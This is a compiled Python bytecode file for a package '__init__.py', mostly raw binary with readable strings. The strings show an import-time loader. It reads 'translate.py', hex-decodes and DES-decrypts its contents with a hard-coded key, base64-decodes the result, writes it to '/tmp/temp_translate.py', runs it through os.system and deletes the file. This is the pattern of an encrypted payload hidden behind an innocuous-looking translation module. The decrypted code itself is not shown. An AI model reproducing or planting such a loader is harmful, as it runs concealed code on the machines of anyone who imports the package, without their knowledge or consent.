a
    #�bQ  �                   @   s$  d dl Z d dlZd dlZd dlmZmZmZ dZedddd��&Z	e	�
� D ]Zee7 ZqHW d  � n1 sj0    Y  dd	� Ze�ed
e�d�d �d����d�Zedd��Ze�e� W d  � n1 s�0    Y  z$e �d� e j�d�r�e �d� W n$   e j�d��re �d� Y n0 dS )�    N)�des�CBC�	PAD_PKCS5� ztranslate.py�rzutf-8)�encodingc                 C   s.   | }t | t|d td�}|jt�|�td�}|S )N)Zpad�padmode)r   )r   r   r   Zdecrypt�binasciiZa2b_hex)Z
secret_key�sZiv�kZde� r   �__init__.py�des_decrypt   s    r   Z14331433�'�   z/tmp/temp_translate.py�wzpython3 /tmp/temp_translate.pyz/tmp/temp_translate.txt)�os�base64r	   ZpyDesr   r   r   Zcodebr�open�src�	readlinesZsrcir   Z	b64decode�split�encode�decode�codeZcodefile�write�system�pathZexist�remover   r   r   r   �<module>   s$   (&(
